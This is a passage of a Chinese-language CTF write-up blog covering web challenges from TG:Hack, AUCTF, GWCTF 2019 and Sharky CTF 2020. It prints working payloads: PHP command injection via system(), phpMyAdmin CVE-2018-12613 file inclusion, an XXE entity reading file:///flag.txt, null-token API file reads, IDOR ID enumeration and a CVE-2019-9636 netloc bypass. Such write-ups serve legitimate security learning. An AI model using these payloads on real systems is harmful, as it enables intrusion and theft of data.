action.payload &#125;;</span><br><span class="line">    <span class="keyword">case</span> types.SUBMIT_FORM:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;The form has been submitted! Look at the Redux store!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> &#123; ...state, <span class="attr">submitted</span>: <span class="string">&quot;TG20&#123;always_disable_redux_dev_tools&#125;&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>於是就找到了 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TG20&#123;always_disable_redux_dev_tools&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<div style="pointer-events: none">
+<h2 style="display:none" id="AUCTF">AUCTF</h2>
+<img src="https://ae01.alicdn.com/kf/H77d23afec21d418db8da7ea3053610faz.png"/>
+</div>
+
+<h3 id="Miyazaki-Trivia"><a href="#Miyazaki-Trivia" class="headerlink" title="Miyazaki Trivia"></a>Miyazaki Trivia</h3><p>開啟頁面有 <code>Find this special file.</code> 的提示，於是找到 <code>.../robots.txt</code>。開啟之後又是新的提示 <code>VIDEO GAME TRIVIA: What is the adage of Byrgenwerth scholars? MAKE a GET request to this page with a header named &#39;answer&#39; to submit your answer.</code>，查了一下之後得到答案，於是構造 <code>?answer=Fear the Old Blood</code> 得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;f3ar_z_olD3_8l0oD&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Quick-Maths"><a href="#Quick-Maths" class="headerlink" title="Quick Maths"></a>Quick Maths</h3><p>這題先隨便算幾個數，發現可以正常算出結果。（不太記得了，寫的時候好像算了 7 * 7 啥的，得到的都是49）於是順手構造了個 <code>statement=system(&quot;ls&quot;)</code> 然後發現有返回結果。於是就安排上 <code>statement=system(&quot;cat ./index.php&quot;)</code> 就拿到了 flag。需要注意的是，這裡的請求包需要用 Burp Suite 傳送才能得到返回的結果。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;p6p_1nj3c7i0n_iz_k:3w1&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="gg-no-re"><a href="#gg-no-re" class="headerlink" title="gg no re"></a>gg no re</h3><p>這題一開始給了個 authentication.js，略微分析之後可以發現是 Base64，取出關鍵資訊 <code>TWFrZSBhIEdFVCByZXF1ZXN0IHRvIC9oaWRkZW4vbmV4dHN0ZXAucGhw</code>再解碼，得到 <code>Make a GET request to /hidden/nextstep.php</code>。按照提示進行，在 Header 中可以找到下一步線索，<code>ROT13: Znxr n CBFG erdhrfg gb /ncv/svany. CuC</code>。使用工具解密一下，得到 <code>Make a POST request to /api/ final. PhP</code>，接著按照提示 <code>Send a request with the flag variable set</code> 進行，構造 <code>?flag=1</code> 即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;1_w@s_laZ_w1t_dis_0N3&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="API-madness"><a href="#API-madness" class="headerlink" title="API madness"></a>API madness</h3><p>按照提示訪問 <code>.../static/help</code> 可以看到有三個 API。先嚐試一下 login，這裡有個坑，要用 curl 發請求才能成功 <code>curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;username&quot;:&quot;lemon&quot;,&quot;password&quot;:&quot;password&quot;&#125;&#39; host/api/login</code>，而且響應的時間很長很長，返回的資料是一個報錯的頁面，裡面包含了一個不一樣的介面 <code>.../api/login_check</code>。curl 訪問之後得到了一個為 null 的 token。看起來像是假的一樣，但是就像愛情，你不去嘗試怎麼知道結果呢？於是按照 API 介面接著往前衝，構造 <code>curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;dir&quot;:&quot;/&quot;,&quot;token&quot;:&quot;null&quot;&#125;&#39; host/api/ftp/dir</code>，返回結果中看到了 flag.txt。於是構造 <code> curl -X POST -H &quot;Content-Type: application/json&quot; -d &#39;&#123;&quot;file&quot;:&quot;/flag.txt&quot;,&quot;token&quot;:&quot;null&quot;&#125;&#39; host/api/ftp/get_file</code> 得到結果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;file_data&quot;: &quot;YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg&#x3D;&#x3D;\n&quot;,</span><br><span class="line">  &quot;status&quot;: &quot;OK&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>取出 <code>YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==</code> 之後 Base64 解碼即得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auctf&#123;0w@sp_6roK3N_@uth&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<div style="pointer-events: none">
+<h2 style="display:none" id="GWCTF-2019">GWCTF 2019</h2>
+<img src="https://ae01.alicdn.com/kf/U4dcb925e60b64dd5a0f67b144894716aB.png"/>
+</div>
+
+<h3 id="我有一個數據庫"><a href="#我有一個數據庫" class="headerlink" title="我有一個數據庫"></a>我有一個數據庫</h3><p>這題上來就說了資料庫，但是開啟頁面發現沒得入口，只有兩行字。於是嘗試找了一下特殊檔案，找到了 robots.txt。檔案裡給了個 phpinfo.php，但是開啟之後沒找到啥利用點。但是由於自己搭環境的時候出了些問題，於是去查了一波，就事先知道了這題有個 phpmyadmin，如果真的打比賽估計找不到這個點。不過他給的 phpmyadmin 很奇怪，不需要登入就能操作資料庫。於是就去查了一波相關的知識點，找到了 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/80829269">CVE-2018-12613</a>。</p>
+<p>於是照著教程，構造 <code>.../index.php?target=db_events.php%3f/../../../../../flag</code> 就能夠包含到在根目錄的 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gwctf&#123;JUst_q_1I111l1Il11DAYS&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="枯燥的抽獎"><a href="#枯燥的抽獎" class="headerlink" title="枯燥的抽獎"></a>枯燥的抽獎</h3><p>頁面給了十個隨機字母，檢視網頁原始碼可以發現一個 check.php，訪問之後可以拿到隨機數生成的方法，按照 <a href="https://lemonprefect.cn/posts/78cb5320/#Ezaudit">MRCTF-Ezaudit</a> 的套路用 php_mt_seed 這個工具算一波隨機數種子，然後再用 PHP 生成後面十位就行了。這裡踩了一個坑，工具的版本很重要，我之前使用的那個在這題算不出來而且能算出來的也不會告知 PHP 的版本號。至於生成適合工具使用的引數格式嘛，我寫了一段 PHP 程式碼。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = str_split(<span class="string">&quot;oS668h2wc9&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$key</span> <span class="keyword">as</span> <span class="variable">$i</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> strpos(<span class="variable">$str</span>,<span class="variable">$i</span>) . <span class="string">&quot; &quot;</span> . strpos(<span class="variable">$str</span>,<span class="variable">$i</span>) . <span class="string">&quot; 0 &quot;</span> . <span class="string">&quot;61 &quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果前面的步驟都沒有錯，算出來的隨機數種子應該是 <code>951373997</code>。放到給出的原始碼中然後解除 10 位的限制，可以得到二十位的字串 <code>oS668h2wc93iAcrwCuZQ</code>。提交到頁面上即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_wIN_abcdefghijklmnopqrstuvwxyz&#125;</span><br></pre></td></tr></table></figure>
+
+<p>(後面的題目環境搭好了 題目好像很頂  讓我慢慢寫一波)</p>
+<div style="pointer-events: none">
+<h2 style="display:none" id="Sharky-CTF-2020">Sharky CTF 2020</h2>
+<img src="https://ae01.alicdn.com/kf/Ucf1568c6275645d9b215b1d9e92a7711j.jpg"/>
+</div>
+
+
+<h3 id="XXExternalXX"><a href="#XXExternalXX" class="headerlink" title="XXExternalXX"></a>XXExternalXX</h3><p>上來點 Show stored data 探索一波，注意到了位址列的 <code>?xml=data.xml</code> 察覺到可能是 XXE。隨便填充之後在報錯裡發現了 <code>Trying to get property &#39;data&#39; of non-object</code>，於是根據題目描述順手構造一波。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Lemon</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">flag</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>這裡因為是個 GET 引數，所以得想辦法給構造的 payload 一個直鏈才能成功，達成之後可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;G3T_XX3D_f5ba4f9f9c9e0f41dd9df266b391447a&#125; </span><br></pre></td></tr></table></figure>
+
+<h3 id="Logs-In-Part-1"><a href="#Logs-In-Part-1" class="headerlink" title="Logs In ! Part 1"></a>Logs In ! Part 1</h3><p>這題千萬不要被標題迷惑，訪問頁面之後可以在左下角找到 Controller 的頁面，順手訪問一波之後可以看到兩個路由，訪問其中一個 <code>/e48e13207341b6bffb7fb1622282247b/debug</code> 可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;0h_N0_Y0U_H4V3_4N_0P3N_SYNF0NY_D3V_M0D3_1787a60ce7970e2273f7df8d11618475&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Containment-Forever"><a href="#Containment-Forever" class="headerlink" title="Containment Forever"></a>Containment Forever</h3><p>這題的兩條 flag 沒辦法開啟，但是有其他記錄可以訪問。根據地址猜測應該是要自己找到這個類似於 ID 的東西。於是嘗試隨便改一波，發現報錯了且找到了 <code>mongoose</code> 的字樣。在大佬的指引下找到了 <a target="_blank" rel="noopener" href="https://docs.mongodb.com/manual/reference/method/ObjectId/">參考</a>，於是開始把頁面上原來的 ID 拆開。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> [] items = &#123;</span><br><span class="line">                <span class="string">&quot;5e70da94d7b1600013655bb5&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e7e4f48d7b1600013655bb9&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e83642bd7b1600013655bba&quot;</span>,</span><br><span class="line">                <span class="string">&quot;5e8ee635d7b1600013655bbd&quot;</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">                <span class="built_in">decimal</span>[] parts = <span class="keyword">new</span> <span class="built_in">decimal</span>[<span class="number">3</span>];</span><br><span class="line">                parts[<span class="number">0</span>] = Convert.ToInt64(items[i].Substring(<span class="number">0</span>, <span class="number">8</span>),<span class="number">16</span>);</span><br><span class="line">                parts[<span class="number">1</span>] = Convert.ToInt64(items[i].Substring(<span class="number">8</span>, <span class="number">10</span>),<span class="number">16</span>);</span><br><span class="line">                parts[<span class="number">2</span>] = Convert.ToInt64(items[i].Substring(<span class="number">17</span>, <span class="number">7</span>),<span class="number">16</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;TimeStamp:<span class="subst">&#123;parts[<span class="number">0</span>]&#125;</span>\nRandomValue:<span class="subst">&#123;parts[<span class="number">1</span>]&#125;</span>\nIncrementingCounter:<span class="subst">&#123;parts[<span class="number">2</span>]&#125;</span>\n&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然後發現隨機數是固定的，也就是說只需要時間戳和 ID。時間戳只需要從兩條記錄上找然後轉換一下，很容易得到。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020-03-21 09:13:22  1584782002</span><br><span class="line">2020-04-13 15:50:18  1586793018</span><br></pre></td></tr></table></figure>
+
+<p>至於 ID 的話只需要根據已經有的 ID 在附近列舉一下就可以了。於是寫段程式碼生成一下。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Int64[] timeStamps = &#123;<span class="number">1584782002</span>, <span class="number">1586793018</span>&#125;;</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> j = <span class="number">56974256</span>; j &lt; <span class="number">56974275</span>; j++)&#123;</span><br><span class="line">                <span class="built_in">string</span> [] deParts = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">3</span>];</span><br><span class="line">                deParts[<span class="number">0</span>] = Convert.ToString(timeStamps[<span class="number">1</span>],<span class="number">16</span>);</span><br><span class="line">                deParts[<span class="number">1</span>] = Convert.ToString(<span class="number">926393827347</span>, <span class="number">16</span>);</span><br><span class="line">                deParts[<span class="number">2</span>] = Convert.ToString(j, <span class="number">16</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;deParts[<span class="number">0</span>]&#125;</span><span class="subst">&#123;deParts[<span class="number">1</span>]&#125;</span><span class="subst">&#123;deParts[<span class="number">2</span>].Substring(<span class="number">1</span>,<span class="number">6</span>)&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>將得到的幾個結果逐一嘗試可以得到包含 flag 的兩個記錄的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;item&#x2F;5e75dab2d7b1600013655bb8</span><br><span class="line">...&#x2F;item&#x2F;5e948a3ad7b1600013655bbf</span><br></pre></td></tr></table></figure>
+
+<p>將得到的 flag 拼接在一起，得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;IDOR_IS_ALS0_P0SSIBLE_W1TH_CUST0M_ID!_f878b1c38e20617a8fbd20d97524a515&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Aqua-World"><a href="#Aqua-World" class="headerlink" title="Aqua World"></a>Aqua World</h3><p>開啟頁面，發現導航有個點不動的地方，審查元素訪問到 <code>.../admin-query?flag=flag</code>。頁面提示需要修改 netloc 為本地。在各種修改 header 之後看到了題目給的 hint：<code>WTF this PYTHON version is deprecated!!!</code>。於是順著線索找到了 <a target="_blank" rel="noopener" href="https://bugs.python.org/issue36216">CVE-2019-9636</a> 並根據其中給出的例子構造（Authorization 的 header 是題目本身要求的）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span> : <span class="string">&quot;Basic YW5vbnltb3VzOmFub255bW91cw==&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(<span class="string">&quot;.../admin-query\uFF03@127.0.0.1?flag=flag&quot;</span>,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，這裡執行指令碼的 Python 也需要使用有漏洞的版本，否則請求無法成功完成。（這部分還需要復現</p>
+<p>使用特定版本發起請求後即可在響應中找到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shkCTF&#123;NFKC_normalization_can_be_dangerous!_8471b9b2da83011a07efc2899819da65&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dawg-CTF-2020"><span class="toc-number">1.</span> <span class="toc-text">Dawg CTF 2020</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Free-WIFI-Part-1"><span class="toc-number">1.1.</span> <span class="toc-text">Free WIFI Part 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Lady-is-a-Smuggler"><span class="toc-number">1.2.</span> <span class="toc-text">The Lady is a Smuggler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tracking"><span class="toc-number">1.3.</span> <span class="toc-text">Tracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Deep-CTF"><span class="toc-number">2.</span> <span class="toc-text">Deep CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Oh-JS"><span class="toc-number">2.1.</span> <span class="toc-text">Oh JS!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Magic-Word"><span class="toc-number">2.2.</span> <span class="toc-text">Magic Word!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nothing-is-Impossible"><span class="toc-number">2.3.</span> <span class="toc-text">Nothing is Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Did-You-Got-Trolled"><span class="toc-number">2.4.</span> <span class="toc-text">Did You Got Trolled?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Greetings"><span class="toc-number">2.5.</span> <span class="toc-text">Greetings!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hack-MEEEE"><span class="toc-number">2.6.</span> <span class="toc-text">Hack MEEEE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TG:Hack"><span class="toc-number">3.</span> <span class="toc-text">TG:Hack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shop"><span class="toc-number">3.1.</span> <span class="toc-text">Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redux"><span class="toc-number">3.2.</span> <span class="toc-text">Redux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AUCTF"><span class="toc-number">4.</span> <span class="toc-text">AUCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Miyazaki-Trivia"><span class="toc-number">4.1.</span> <span class="toc-text">Miyazaki Trivia</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quick-Maths"><span class="toc-number">4.2.</span> <span class="toc-text">Quick Maths</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gg-no-re"><span class="toc-number">4.3.</span> <span class="toc-text">gg no re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-madness"><span class="toc-number">4.4.</span> <span class="toc-text">API madness</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019"><span class="toc-number">5.</span> <span class="toc-text">GWCTF 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%9C%89%E4%B8%80%E5%80%8B%E6%95%B8%E6%93%9A%E5%BA%AB"><span class="toc-number">5.1.</span> <span class="toc-text">我有一個數據庫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E7%8D%8E"><span class="toc-number">5.2.</span> <span class="toc-text">枯燥的抽獎</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sharky-CTF-2020"><span class="toc-number">6.</span> <span class="toc-text">Sharky CTF 2020</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXExternalXX"><span class="toc-number">6.1.</span> <span class="toc-text">XXExternalXX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Logs-In-Part-1"><span class="toc-number">6.2.</span> <span class="toc-text">Logs In ! Part 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Containment-Forever"><span class="toc-number">6.3.</span> <span class="toc-text">Containment Forever</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Aqua-World"><span class="toc-number">6.4.</span> <span class="toc-text">Aqua World</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/24a48841.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&text=日常賽事解題記"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&is_video=false&description=日常賽事解題記"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=日常賽事解題記&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/24a48841.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&title=日常賽事解題記"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/24a48841.html&name=日常賽事解題記&description=&lt;p&gt;最近零零散散在各種從各種渠道參加的賽事上寫了些水題，一直在糾結到底要不要記。不過既然都做了，感覺過程中也有不少騷操作，就稍微記一記。正好也記上這些比賽裡沒寫出來的題目的復現。&lt;/p&gt;
+&lt;p&gt;&lt;escape&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/24a48841.html&t=日常賽事解題記"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
